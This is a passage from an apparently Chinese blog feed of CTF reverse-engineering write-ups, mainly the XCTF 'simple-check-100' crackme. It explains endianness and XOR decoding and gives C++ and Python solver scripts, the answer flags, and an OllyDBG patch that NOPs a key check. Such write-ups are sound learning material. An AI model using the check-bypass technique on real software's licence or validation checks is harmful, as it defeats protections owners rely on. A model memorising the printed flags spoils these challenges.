punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>RC3-2016-XORISGUD</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/LuzkRoMngX4BQPs.png" alt="攻防世界-logmein3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-simple-check-100</title>
      <link href="/2023/03165d3ea0.html"/>
      <url>/2023/03165d3ea0.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>了解数据的<mark>大端序、小端序</mark>存放</p></li><li><p>看懂类似于  * (4 * i + v4) 写法的含义【不一定是顺序数组，可能是好几个地址的值组合起来作为数组的一个元素】</p></li><li><p><mark>数据的存放方式转化为十六进制看得更清楚</mark>【IDA 快捷键：h】<br>例如：-559038737（0xDEADBEEF）、106（0x6A）、-51（0xCD）等</p></li><li><p><mark>数据转化为十六进制进行异或时，位数应该相同【32位 对 32位，8位 对 8位】</mark><br><mark>可以用十进制和十六进制直接进行异或，n 进制只是为了方便给人看的，计算机理解和存储的方式都是二进制数</mark></p></li><li><p><strong>Windows 下 OllyDBG 调试</strong></p></li><li><p><strong>Linux 下 GDB 调试</strong></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=bbfa61dd-8934-4c0d-be63-9b7acb7f8d16_2&task_category_id=4">攻防世界-simple-check-100</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>给出了三个文件，分别是一个 32位 exe，一个 32位 elf，一个 64位 elf<br>将 64位 elf 拖入 IDA<br><img src="https://s2.loli.net/2023/03/18/EZbN8Q6hKGyYAOd.png" alt="攻防世界-simple-check-100 1.png"></p></li><li><p>输入的 key 存放在 v9 的位置，<code>check_key(v9)</code> 对输入的 key 做了一个检测，若 <code>check_key(v9)</code> 返回 true，则调用 <code>interesting_function(v7)</code></p></li><li><p>查看 <code>check_key(v9)</code>：<br><img src="https://s2.loli.net/2023/03/18/HlZ3PiTQUDeYzp4.png" alt="攻防世界-simple-check-100 2.png"></p></li><li><p>即对 key 的每一位进行相加求和，若和为 -559038737（十六进制：0xDEADBEEF），就返回 true</p></li><li><p>查看 <code>interesting_function(v7)</code>：<br><img src="https://s2.loli.net/2023/03/18/9zycstvrkjK8iVb.png" alt="攻防世界-simple-check-100 3.png"></p></li><li><p>调用的这个函数只有一个输出，这里的 putchar 输出的应该就是 flag，而这个函数的处理过程与 key 没有关系，所以可以通过这个代码直接求解出 flag</p></li><li><p>注意这里 <code>*(4 * i + v4)</code> 的写法：</p><ul><li>v4 &#x3D; a1，a1 又是作为形参传入函数 <code>int __fastcall interesting_function(__int64 a1)</code> 的，所以 a1、v4 的值为 <code>v7[]</code> 的首地址</li><li><code>(4 * i + v4) 以 v7[]</code> 的首地址作为基地址，偏移量为 <code>4 * i</code>，即：将首地址的后 4 个地址的值作为一组</li><li>根据 <code>v2 = *(4 * i + v4) ^ 0xDEADBEEF</code> 可知，<code>*(4 * i + v4)</code> 的值的长度应该跟 <code>0xDEADBEEF</code> 一样，是一个 32位 的数据【 DWORD，全称 Double Word 】</li></ul></li><li><p>根据 <code>v7[]</code> 的定义（<strong>将值转化为 16进制</strong>）：<br><code>v7[]</code> 中每一个地址存放的数据长度是 2个 十六进制数据</p><pre class="language-c" data-language="c"><code class="language-c">v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x54</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC8</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x7E</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x64</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC7</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x16</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x9A</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCD</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x65</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x32</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2D</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD3</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x43</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x92</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA9</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x9D</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD2</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE6</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6D</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2C</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD3</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xB6</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBD</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFE</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6A</span><span class="token punctuation">;</span></code></pre></li><li><p>将首地址的后 4 个地址的值作为一组，则一组正好是 8 个十六进制数（一个十六进制数为 4位，故 8个 十六进制数共 32位 DWORD 数据）</p></li><li><p>循环条件 <code>for ( i = 0; i &lt;= 6; ++i )</code> 可以看出总共异或了 7 次，所以 <code>*(4 * i + v4)</code> 应该有 7 组，一组占 <code>v7[]</code> 的 4 个地址<br>也就是说 <code>v7[0] ~ v7[3]</code> 为一组，<code>v7[4] ~ v7[7]</code> 为二组，<code>v7[8] ~ v7[11]</code> 为三组，… … ，<code>v7[24] ~ v7[27]</code> 为七组</p></li><li><p>这里需要注意，异或后的值是从高地址处的字节开始异或的，又由于小端存放的原因，每一组数据按小端顺序：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">1</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xE37EC854</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x9A16C764</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x326511CD</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x43D3E32D</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xD29DA992</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">6</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xD32C6DE6</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x6AFEBDB6</span></code></pre></li><li><p>v2 为异或的结果，v3 为 v2 的首地址，<code>*(v3 + j)</code> 为每一轮异或的结果，再与 <code>flag_data[4 * i + j]</code> 异或，得到异或之后的 <code>*(v3 + j)</code> 的结果：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x3dd376bb</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x44bb798b</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xecc8af22</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x9d7e5dc2</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x0c30177d</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x0d81d309</span><span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb4530359</span></code></pre></li><li><p><strong>这里要注意</strong><br> <code>*(4 * i + v4)</code> 和 <code>0xDEADBEEF</code> 异或得到的 <code>*(v3 + j)</code> 也是一个 32位（8个 十六进制）的数据，而 <code>flag_data[4 * i + j]</code> 是 8位（2 个 十六进制），因此 for 循环 <code>for ( j = 3; j &gt;= 0; --j )</code> 分四轮，每次用 <code>*(v3 + j)</code> 中的两个 十六进制 与 <code>flag_data[4 * i + j]</code> 的两个 十六进制 进行异或</p></li><li><p>之所以循环条件写的是 <code>for ( j = 3; j &gt;= 0; --j )</code>，是为了按 小端序 取 <code>flag_data[4 * i + j]</code> 中的数据来异或</p></li><li><p>看似 <code>*(v3 + j)</code> 中的数据是按正序来取的，但其实前面在处理 <code>*(4 * i + v4)</code> 的时候，已经将 <code>v7[]</code> 的小端序写成了大端序，所以 <code>*(v3 + j)</code> 正序其实对应的是 <code>*(4 * i + v4)</code> 的正序，也就是 <code>v7[]</code> 的反序；即：<mark>大地址和大地址异或，小地址和小地址异或，一一对应</mark></p></li><li><p>根据以上条件将代码复现一遍即可，程序运行后输出的就是flag</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>std<span class="token double-colon punctuation">::</span>string <span class="token function">tohex</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">//定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">//存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">//以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">//合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//取右width位</span>    <span class="token keyword">return</span> s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">Hex_to_Dec</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 处理a-f</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">70</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 处理A-F</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 处理0-9</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>length<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        index<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xE37EC854</span><span class="token punctuation">,</span><span class="token number">0x9A16C764</span><span class="token punctuation">,</span><span class="token number">0x326511CD</span><span class="token punctuation">,</span><span class="token number">0x43D3E32D</span><span class="token punctuation">,</span><span class="token number">0xD29DA992</span><span class="token punctuation">,</span><span class="token number">0xD32C6DE6</span><span class="token punctuation">,</span><span class="token number">0x6AFEBDB6</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    string key_data<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> flag_data<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span>            <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xD3</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key_xor<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> loop<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        key_data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">tohex</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>j <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            key_xor <span class="token operator">=</span> <span class="token function">Hex_to_Dec</span><span class="token punctuation">(</span>key_data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token operator">+</span> loop<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            loop <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>key_xor <span class="token operator">^</span> flag_data<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre class="language-python" data-language="python"><code class="language-python">key_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xE37EC854</span><span class="token punctuation">,</span> <span class="token number">0x9A16C764</span><span class="token punctuation">,</span> <span class="token number">0x326511CD</span><span class="token punctuation">,</span> <span class="token number">0x43D3E32D</span><span class="token punctuation">,</span> <span class="token number">0xD29DA992</span><span class="token punctuation">,</span> <span class="token number">0xD32C6DE6</span><span class="token punctuation">,</span> <span class="token number">0x6AFEBDB6</span><span class="token punctuation">]</span>flag_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>key_data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xDEADBEEF</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">:</span>            tmp <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token string">'0'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">print</span>        <span class="token string">"The XOR value:"</span> <span class="token operator">+</span> tmp        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> j <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token number">2</span> <span class="token operator">*</span> j <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> flag_data<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">-</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag:"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    decode<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag_is_you_know_cracking!!!</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/ejpDXuUHEoZvBL2.png" alt="攻防世界-simple-check-100 4.png"></p><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>除直接解算法以外，还可以通过 OllyDBG 调试，绕过 if 判断语句，让程序自己输出 flag<br>将 32位 exe 程序拖入 OllyDBG，定位到 if 条件的位置<br><img src="https://s2.loli.net/2023/03/18/FjINLo9pCcuJ3gy.png" alt="攻防世界-simple-check-100 5.png"></p></li><li><p>手动将这里的判断条件 <code>test eax,eax</code> 给 nop 掉<br><img src="https://s2.loli.net/2023/03/18/WOtpebqmQzcGUyD.png" alt="攻防世界-simple-check-100 6.png"></p></li><li><p>执行程序，key 随便输入即可<br><img src="https://s2.loli.net/2023/03/18/SkoLEWZObJpP2VT.png" 